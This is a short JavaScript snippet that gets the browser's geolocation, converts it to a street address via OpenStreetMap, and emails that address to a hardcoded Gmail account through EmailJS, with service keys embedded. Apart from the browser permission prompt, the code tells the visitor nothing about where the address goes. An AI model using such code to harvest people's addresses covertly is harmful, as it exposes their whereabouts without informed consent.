function getLocation() {
    // emailjs.init('BpiGrXi6jmGAU66nc');
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showLocation);
    } else {
        console.log("Geolocation is not supported by this browser.")
    }
}
 function showLocation(position) {
    let dubemLat = position.coords.latitude
    let dubemLon = position.coords.longitude
    console.log("Latitude: " + dubemLat + 
   " Longitude: " + dubemLon);

    var url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${dubemLat}&lon=${dubemLon}`;

    fetch(url) 
    .then(response => response.json())
    .then(data => {
        if (data && data.address) {
            console.log('Address: ' + data.display_name);
            let address = data.display_name
            console.log(address)
            sendAddressEmail('onyiavitus@gmail.com', 'User Location', `My address is: ${address}`);
        } else {
            console.log('No results found');
        }
    })
    .catch(error => console.log('Error:', error));
}

function sendAddressEmail(email, subject, body) {
    var templateParams = {
        to_email: email,
        subject: subject,
        message: body
    };
    emailjs.init('HhEOj9XKqjETk8CZD');

    emailjs.send('service_eiovwrq', 'template_tzohn6r', templateParams)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
        }, function(error) {
            console.log('FAILED...', error);
        });
}



